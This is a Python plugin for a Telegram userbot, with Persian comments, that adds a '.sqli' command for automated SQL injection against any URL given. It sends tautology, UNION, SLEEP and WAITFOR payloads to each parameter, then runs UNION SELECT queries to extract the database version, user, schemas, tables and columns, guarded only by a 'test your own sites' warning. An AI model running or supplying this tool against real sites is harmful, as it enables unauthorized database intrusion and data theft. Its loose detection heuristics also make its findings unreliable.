# plugins/sqlinjection.py

from telethon import events
from client import client
import aiohttp
import urllib.parse
import re
import asyncio
import json
import time
from typing import List, Dict, Optional

class SQLInjectionTester:
    def __init__(self):
        self.vulnerable_urls = []
        self.extracted_data = {
            'databases': [],
            'tables': [],
            'columns': [],
            'version': None,
            'user': None
        }
        self.session = None
        
    async def test_basic_injection(self, url: str, param: str, original_content: str) -> List[Dict]:
        """تست payloadهای پایه SQL injection"""
        basic_payloads = [
            "'", "''", "`", "``", '"', '""',
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
            "' OR 1=1--", "' OR 1=1#", "') OR ('1'='1--",
            "1' AND 1=1--", "1' AND 1=2--",
            "1' ORDER BY 1--", "1' ORDER BY 100--",
            "1' UNION SELECT 1--", "1' UNION SELECT 1,2--",
            "1' AND SLEEP(3)--", "1'; WAITFOR DELAY '00:00:03'--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
        ]
        
        vulnerabilities = []
        
        for payload in basic_payloads:
            try:
                test_url = self._build_test_url(url, param, payload)
                
                start_time = time.time()
                async with self.session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    content = await resp.text()
                    response_time = time.time() - start_time
                    
                    # بررسی نشانه‌های مختلف SQL injection
                    vuln_type = self._detect_vulnerability_type(content, resp.status, response_time, original_content)
                    
                    if vuln_type:
                        vulnerabilities.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': vuln_type,
                            'status': resp.status,
                            'response_time': response_time,
                            'content_length': len(content)
                        })
                        
                        # اگر vulnerability پیدا شد، سعی در استخراج اطلاعات
                        if vuln_type in ['error_based', 'union_based']:
                            await self._extract_database_info(url, param, payload)
                            
            except asyncio.TimeoutError:
                # احتمال time-based injection
                vulnerabilities.append({
                    'url': test_url,
                    'param': param,
                    'payload': payload,
                    'type': 'time_based',
                    'status': 'timeout',
                    'response_time': 15.0,
                    'content_length': 0
                })
            except Exception:
                continue
                
        return vulnerabilities
    
    async def _extract_database_info(self, url: str, param: str, base_payload: str):
        """استخراج اطلاعات دیتابیس"""
        extraction_payloads = {
            'version': [
                f"1' UNION SELECT @@version,2,3--",
                f"1' UNION SELECT version(),2,3--",
                f"1' UNION SELECT sqlite_version(),2,3--"
            ],
            'user': [
                f"1' UNION SELECT user(),2,3--",
                f"1' UNION SELECT current_user(),2,3--",
                f"1' UNION SELECT system_user(),2,3--"
            ],
            'databases': [
                f"1' UNION SELECT schema_name,2,3 FROM information_schema.schemata--",
                f"1' UNION SELECT database(),2,3--",
                f"1' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'--"
            ],
            'tables': [
                f"1' UNION SELECT table_name,2,3 FROM information_schema.tables--",
                f"1' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table'--",
                f"1' UNION SELECT tablename,2,3 FROM pg_tables--"
            ],
            'columns': [
                f"1' UNION SELECT column_name,2,3 FROM information_schema.columns--",
                f"1' UNION SELECT sql,2,3 FROM sqlite_master WHERE type='table'--"
            ]
        }
        
        for info_type, payloads in extraction_payloads.items():
            for payload in payloads:
                try:
                    test_url = self._build_test_url(url, param, payload)
                    async with self.session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        content = await resp.text()
                        
                        # استخراج اطلاعات از response
                        extracted = self._parse_extracted_data(content, info_type)
                        if extracted:
                            if info_type in ['version', 'user']:
                                self.extracted_data[info_type] = extracted
                            else:
                                self.extracted_data[info_type].extend(extracted)
                            break
                            
                except Exception:
                    continue
    
    def _build_test_url(self, base_url: str, param: str, payload: str) -> str:
        """ساخت URL تست با payload"""
        parsed = urllib.parse.urlparse(base_url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param] = [payload]
        
        new_query = urllib.parse.urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _detect_vulnerability_type(self, content: str, status: int, response_time: float, original_content: str) -> Optional[str]:
        """تشخیص نوع آسیب‌پذیری SQL injection"""
        content_lower = content.lower()
        
        # Error-based detection
        sql_errors = [
            'sql syntax', 'mysql_fetch', 'ora-', 'microsoft odbc',
            'sqlite_', 'postgresql', 'warning: mysql', 'valid mysql result',
            'mysqlclient', 'microsoft jet database', 'odbc drivers error',
            'invalid query', 'sql command not properly ended',
            'quoted string not properly terminated', 'unclosed quotation mark',
            'syntax error', 'mysql_num_rows', 'mysql_query', 'pg_query',
            'sqlite3.operationalerror', 'database error', 'sql error'
        ]
        
        if any(error in content_lower for error in sql_errors):
            return 'error_based'
        
        # Time-based detection
        if response_time > 3.0:
            return 'time_based'
        
        # Union-based detection
        if 'union' in content_lower and len(content) > len(original_content) * 1.2:
            return 'union_based'
        
        # Boolean-based detection
        content_diff = abs(len(content) - len(original_content))
        if content_diff > 100 or status != 200:
            return 'boolean_based'
        
        return None
    
    def _parse_extracted_data(self, content: str, info_type: str) -> List[str]:
        """استخراج اطلاعات از response"""
        extracted = []
        
        # الگوهای مختلف برای استخراج اطلاعات
        patterns = {
            'version': [r'(\d+\.\d+\.\d+[^\s<]*)', r'MySQL\s+([\d\.]+)', r'PostgreSQL\s+([\d\.]+)'],
            'user': [r'([a-zA-Z0-9_]+@[a-zA-Z0-9_\.-]+)', r'user:\s*([^\s<]+)'],
            'databases': [r'Database:\s*([^\s<,]+)', r'Schema:\s*([^\s<,]+)'],
            'tables': [r'Table:\s*([^\s<,]+)', r'table_name[^>]*>([^<]+)'],
            'columns': [r'Column:\s*([^\s<,]+)', r'column_name[^>]*>([^<]+)']
        }
        
        if info_type in patterns:
            for pattern in patterns[info_type]:
                matches = re.findall(pattern, content, re.IGNORECASE)
                extracted.extend(matches)
        
        return list(set(extracted))  # حذف تکراری‌ها

@client.on(events.NewMessage(pattern=r"\.sqli(?:\s+(.+))?", outgoing=True))
async def sql_injection_tester(event):
    url_input = event.pattern_match.group(1)
    reply = await event.get_reply_message()

    if not url_input and reply:
        url_input = reply.message.strip()

    if not url_input:
        await event.reply("""
🔍 **Advanced SQL Injection Tester**
━━━━━━━━━━━━━━━━━━━━━━━━━━
**استفاده:**
`.sqli https://example.com/page.php?id=1`
`.sqli http://target.com/search?q=test`

**قابلیت‌های پیشرفته:**
• تست خودکار انواع SQL injection
• نمایش URLهای آسیب‌پذیر
• استخراج نام دیتابیس و جداول
• تشخیص نوع آسیب‌پذیری
• گزارش کامل امنیتی
• پشتیبانی از MySQL, PostgreSQL, SQLite

⚠️ **هشدار:** فقط برای تست سایت‌های خودتان استفاده کنید!
        """.strip())
        return

    await event.edit("🔍 شروع تست پیشرفته SQL Injection...")

    try:
        # بررسی URL
        if not url_input.startswith(('http://', 'https://')):
            url_input = 'https://' + url_input

        # استخراج پارامترها
        parsed_url = urllib.parse.urlparse(url_input)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        if not params:
            await event.edit("❌ URL باید حاوی پارامتر باشد (مثل ?id=1)")
            return

        # ایجاد instance تستر
        tester = SQLInjectionTester()
        
        await event.edit(f"🔍 تست {len(params)} پارامتر با payloadهای پیشرفته...")

        async with aiohttp.ClientSession() as session:
            tester.session = session
            
            # دریافت response اصلی
            try:
                async with session.get(url_input, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    original_content = await resp.text()
                    original_status = resp.status
            except Exception as e:
                await event.edit(f"❌ نمی‌توان به URL متصل شد: {e}")
                return

            all_vulnerabilities = []
            total_tests = 0
            
            # تست هر پارامتر
            for param_name, param_values in params.items():
                await event.edit(f"🔍 تست پارامتر {param_name}...")
                
                vulnerabilities = await tester.test_basic_injection(url_input, param_name, original_content)
                all_vulnerabilities.extend(vulnerabilities)
                total_tests += len(vulnerabilities)
                
                # محدودیت تعداد تست‌ها
                if total_tests >= 100:
                    break

        # ساخت گزارش پیشرفته
        await event.edit("📊 تجزیه و تحلیل نتایج...")
        
        if all_vulnerabilities:
            # گروه‌بندی بر اساس نوع آسیب‌پذیری
            vuln_types = {}
            vulnerable_urls = []
            
            for vuln in all_vulnerabilities:
                vuln_type = vuln['type']
                if vuln_type not in vuln_types:
                    vuln_types[vuln_type] = []
                vuln_types[vuln_type].append(vuln)
                
                # اضافه کردن URL آسیب‌پذیر
                vulnerable_urls.append({
                    'url': vuln['url'],
                    'param': vuln['param'],
                    'payload': vuln['payload'],
                    'type': vuln['type']
                })
            
            # ساخت گزارش تفصیلی
            vuln_summary = []
            type_icons = {
                'error_based': '🔴',
                'time_based': '🕐',
                'union_based': '🔗',
                'boolean_based': '🟡'
            }
            
            type_names = {
                'error_based': 'Error-based',
                'time_based': 'Time-based',
                'union_based': 'Union-based',
                'boolean_based': 'Boolean-based'
            }
            
            for vuln_type, vulns in vuln_types.items():
                icon = type_icons.get(vuln_type, '⚠️')
                name = type_names.get(vuln_type, vuln_type)
                vuln_summary.append(f"  {icon} **{name}:** {len(vulns)} مورد")
            
            vuln_text = "\n".join(vuln_summary)
            
            # نمایش URLهای آسیب‌پذیر (حداکثر 5 مورد)
            url_list = []
            for i, vuln_url in enumerate(vulnerable_urls[:5]):
                icon = type_icons.get(vuln_url['type'], '⚠️')
                short_url = vuln_url['url'][:80] + '...' if len(vuln_url['url']) > 80 else vuln_url['url']
                url_list.append(f"  {i+1}. {icon} `{short_url}`")
            
            urls_text = "\n".join(url_list)
            if len(vulnerable_urls) > 5:
                urls_text += f"\n  ... و {len(vulnerable_urls) - 5} URL دیگر"
            
            # اطلاعات استخراج شده
            extracted_info = []
            if tester.extracted_data['version']:
                extracted_info.append(f"  🗄️ **نسخه DB:** {tester.extracted_data['version']}")
            if tester.extracted_data['user']:
                extracted_info.append(f"  👤 **کاربر DB:** {tester.extracted_data['user']}")
            if tester.extracted_data['databases']:
                db_list = ', '.join(tester.extracted_data['databases'][:3])
                extracted_info.append(f"  💾 **دیتابیس‌ها:** {db_list}")
            if tester.extracted_data['tables']:
                table_list = ', '.join(tester.extracted_data['tables'][:5])
                extracted_info.append(f"  📋 **جداول:** {table_list}")
            
            extracted_text = "\n".join(extracted_info) if extracted_info else "  ❌ اطلاعات اضافی استخراج نشد"
            
            # تعیین سطح خطر
            total_vulns = len(all_vulnerabilities)
            if total_vulns >= 10:
                risk_level = "🔴 بسیار بالا"
                risk_color = "🔴"
            elif total_vulns >= 5:
                risk_level = "🟠 بالا"
                risk_color = "🟠"
            elif total_vulns >= 2:
                risk_level = "🟡 متوسط"
                risk_color = "🟡"
            else:
                risk_level = "🟢 پایین"
                risk_color = "🟢"
        else:
            vuln_text = "  ✅ هیچ آسیب‌پذیری یافت نشد"
            urls_text = "  ✅ همه URLها امن هستند"
            extracted_text = "  ✅ نیازی به استخراج اطلاعات نیست"
            risk_level = "🟢 امن"
            risk_color = "🟢"
            total_vulns = 0

        msg = f"""
{risk_color} **گزارش کامل SQL Injection**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 **هدف:** {parsed_url.netloc}
📊 **تست شده:** {total_tests} payload
🔍 **پارامترها:** {len(params)}
⚠️ **آسیب‌پذیری:** {total_vulns} مورد
🚨 **سطح خطر:** {risk_level}

📈 **انواع آسیب‌پذیری:**
{vuln_text}

🔗 **URLهای آسیب‌پذیر:**
{urls_text}

💾 **اطلاعات استخراج شده:**
{extracted_text}

⚠️ **هشدار امنیتی:** این ابزار فقط برای تست امنیت سایت‌های خودتان!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """.strip()

        await event.edit(msg)

    except Exception as e:
        await event.edit(f"⚠️ خطا در تست پیشرفته: {str(e)}")
